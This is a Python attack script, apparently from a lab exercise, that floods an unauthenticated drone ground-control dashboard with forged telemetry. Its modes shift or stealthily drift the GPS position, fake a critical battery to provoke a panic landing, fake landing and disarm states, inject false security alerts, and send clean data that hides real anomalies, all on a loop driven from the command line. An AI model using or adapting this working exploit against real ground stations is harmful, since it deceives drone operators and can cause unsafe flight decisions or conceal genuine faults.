#!/usr/bin/env python3
"""
================================================================
  Telemetry Spoofer — Phase 3A: Inject Fake Telemetry to GCS
  Runs on LAPTOP B (Attacker)
================================================================
  Sends fake POST /telemetry requests to the GCS dashboard
  (Laptop A) to overwrite the operator's view with false data.

  The GCS endpoint has ZERO authentication — it blindly accepts:
    gcs.telemetry_data = data.get('telemetry', {})
    gcs.alerts = data.get('alerts', [])

  USAGE:
    python telemetry_spoofer.py --gcs 192.168.1.50
    python telemetry_spoofer.py --gcs 10.193.181.50 --attack gps
    python telemetry_spoofer.py --gcs 10.193.181.50 --attack battery
================================================================
"""

import requests
import json
import time
import argparse
import random
import math

try:
    from colorama import init, Fore, Style
    init()
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ""
    class Style:
        BRIGHT = RESET_ALL = ""


# ==================== ATTACK PAYLOADS ====================

def build_base_telemetry(lat=12.9716, lon=77.5946, alt=10.0):
    """Build a realistic-looking base telemetry payload."""
    return {
        "battery_voltage": round(random.uniform(11.0, 12.6), 2),
        "battery_current": round(random.uniform(5.0, 15.0), 2),
        "battery_level": random.randint(60, 90),
        "latitude": lat,
        "longitude": lon,
        "altitude": round(alt, 2),
        "speed_3d": round(random.uniform(0.0, 5.0), 2),
        "groundspeed": round(random.uniform(0.0, 4.0), 2),
        "airspeed": round(random.uniform(0.0, 4.0), 2),
        "heading": random.randint(0, 359),
        "roll": round(random.uniform(-5, 5), 2),
        "pitch": round(random.uniform(-5, 5), 2),
        "yaw": round(random.uniform(-180, 180), 2),
        "gps_fix_type": 3,
        "satellites": random.randint(8, 14),
        "gps_eph": random.randint(100, 200),
        "flight_mode": "LOITER",
        "armed": True,
        "ekf_ok": True,
        "is_armable": True,
        "last_heartbeat": round(random.uniform(0.1, 0.5), 2),
        "timestamp": time.time()
    }


def attack_gps_shift(base_lat, base_lon, offset_m=500):
    """Shift GPS position by offset_m meters in a random direction."""
    angle = random.uniform(0, 2 * math.pi)
    dlat = (offset_m / 111320) * math.cos(angle)
    dlon = (offset_m / (111320 * math.cos(math.radians(base_lat)))) * math.sin(angle)
    t = build_base_telemetry(base_lat + dlat, base_lon + dlon)
    return t, []


def attack_gps_drift(base_lat, base_lon, step=0):
    """Gradually drift GPS position over time (harder to detect)."""
    drift_per_step = 0.0001  # ~11m per step
    t = build_base_telemetry(
        base_lat + (step * drift_per_step),
        base_lon + (step * drift_per_step * 0.7)
    )
    return t, []


def attack_battery_critical():
    """Fake critical battery to trigger panic landing."""
    t = build_base_telemetry()
    t["battery_level"] = random.randint(1, 5)
    t["battery_voltage"] = round(random.uniform(9.0, 10.0), 2)
    t["battery_current"] = round(random.uniform(20.0, 30.0), 2)
    alerts = [{
        "type": "LOW_BATTERY",
        "severity": "CRITICAL",
        "message": f"Battery critical: {t['battery_level']}%"
    }]
    return t, alerts


def attack_fake_landing():
    """Fake that the drone is landing (but it's not)."""
    t = build_base_telemetry()
    t["flight_mode"] = "LAND"
    t["altitude"] = round(random.uniform(0.1, 2.0), 2)
    t["speed_3d"] = round(random.uniform(0.0, 0.5), 2)
    t["armed"] = False
    return t, []


def attack_inject_alerts():
    """Inject fake security alerts to confuse the operator."""
    t = build_base_telemetry()
    alerts = [
        {"type": "GPS_SPOOFING", "severity": "CRITICAL",
         "message": "Position jumped 847.3m — POSSIBLE GPS SPOOFING"},
        {"type": "GPS_JAMMING", "severity": "HIGH",
         "message": "Low satellites: 2"},
        {"type": "HEARTBEAT_LOSS", "severity": "CRITICAL",
         "message": "Heartbeat lost: 15.2s"},
        {"type": "UNEXPECTED_ARM", "severity": "CRITICAL",
         "message": "Drone armed unexpectedly!"}
    ]
    return t, alerts


def attack_clear_alerts():
    """Send clean telemetry to hide real anomalies."""
    t = build_base_telemetry()
    t["gps_fix_type"] = 3
    t["satellites"] = 12
    t["ekf_ok"] = True
    t["last_heartbeat"] = 0.2
    return t, []


def attack_mode_change(mode="STABILIZE"):
    """Fake a flight mode change."""
    t = build_base_telemetry()
    t["flight_mode"] = mode
    alerts = [{
        "type": "MODE_CHANGE",
        "severity": "HIGH",
        "message": f"Mode: LOITER → {mode}"
    }]
    return t, alerts


# ==================== ATTACK REGISTRY ====================
ATTACKS = {
    "gps": {
        "name": "GPS Position Shift",
        "desc": "Shift drone position 500m in random direction",
        "func": lambda step: attack_gps_shift(12.9716, 77.5946, 500)
    },
    "drift": {
        "name": "GPS Gradual Drift",
        "desc": "Slowly drift GPS position (stealthy)",
        "func": lambda step: attack_gps_drift(12.9716, 77.5946, step)
    },
    "battery": {
        "name": "Battery Critical",
        "desc": "Fake critical battery level (1-5%)",
        "func": lambda step: attack_battery_critical()
    },
    "landing": {
        "name": "Fake Landing",
        "desc": "Show drone as landed and disarmed",
        "func": lambda step: attack_fake_landing()
    },
    "alerts": {
        "name": "Inject Fake Alerts",
        "desc": "Flood dashboard with fake security alerts",
        "func": lambda step: attack_inject_alerts()
    },
    "clear": {
        "name": "Clear Alerts",
        "desc": "Send clean data to hide real anomalies",
        "func": lambda step: attack_clear_alerts()
    },
    "mode": {
        "name": "Mode Change",
        "desc": "Fake flight mode change to STABILIZE",
        "func": lambda step: attack_mode_change("STABILIZE")
    }
}


def send_spoof(gcs_url, telemetry, alerts):
    """Send a spoofed telemetry payload to the GCS."""
    payload = {"telemetry": telemetry, "alerts": alerts}
    try:
        resp = requests.post(gcs_url, json=payload, timeout=3)
        return resp.status_code == 200
    except Exception as e:
        return False


def run_attack(gcs_ip, gcs_port, attack_name, interval, count):
    """Execute a spoofing attack."""
    gcs_url = f"http://{gcs_ip}:{gcs_port}/telemetry"
    attack = ATTACKS[attack_name]

    print(f"\n  {Fore.RED}{Style.BRIGHT}{'='*55}")
    print(f"   LAUNCHING ATTACK: {attack['name'].upper()}")
    print(f"  {'='*55}{Style.RESET_ALL}")
    print(f"  Target:   {gcs_url}")
    print(f"  Attack:   {attack['desc']}")
    print(f"  Interval: {interval}s")
    print(f"  Count:    {'infinite' if count == 0 else count}\n")

    sent = 0
    success = 0
    step = 0

    try:
        while count == 0 or sent < count:
            telemetry, alerts = attack["func"](step)
            ok = send_spoof(gcs_url, telemetry, alerts)

            sent += 1
            step += 1
            if ok:
                success += 1

            status = f"{Fore.GREEN}OK{Style.RESET_ALL}" if ok else f"{Fore.RED}FAIL{Style.RESET_ALL}"
            lat = telemetry.get('latitude', '?')
            lon = telemetry.get('longitude', '?')
            batt = telemetry.get('battery_level', '?')
            mode = telemetry.get('flight_mode', '?')

            print(f"  [{status}] #{sent}  GPS:{lat:.4f},{lon:.4f}  Batt:{batt}%  Mode:{mode}  Alerts:{len(alerts)}")

            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n  {Fore.YELLOW}Stopped.{Style.RESET_ALL}")

    print(f"\n  {Fore.RED}Results: {success}/{sent} payloads delivered{Style.RESET_ALL}")


def main():
    print(f"\n{Fore.RED}{Style.BRIGHT}")
    print("  ╔══════════════════════════════════════════╗")
    print("  ║   💀  TELEMETRY SPOOFER  💀             ║")
    print("  ║   Enemy Drone Detection — Phase 3A      ║")
    print("  ╚══════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")

    parser = argparse.ArgumentParser(description="GCS Telemetry Spoofer")
    parser.add_argument("--gcs", required=True, help="GCS IP (Laptop A)")
    parser.add_argument("--port", type=int, default=5000, help="GCS port")
    parser.add_argument("--attack", choices=list(ATTACKS.keys()), default="gps",
                        help="Attack type")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Seconds between spoofed packets")
    parser.add_argument("--count", type=int, default=0,
                        help="Number of packets (0=infinite)")
    args = parser.parse_args()

    # Show available attacks
    print("  Available attacks:")
    for k, v in ATTACKS.items():
        marker = " >>>" if k == args.attack else "    "
        print(f"  {marker} {k:10s} — {v['desc']}")
    print()

    run_attack(args.gcs, args.port, args.attack, args.interval, args.count)


if __name__ == "__main__":
    main()
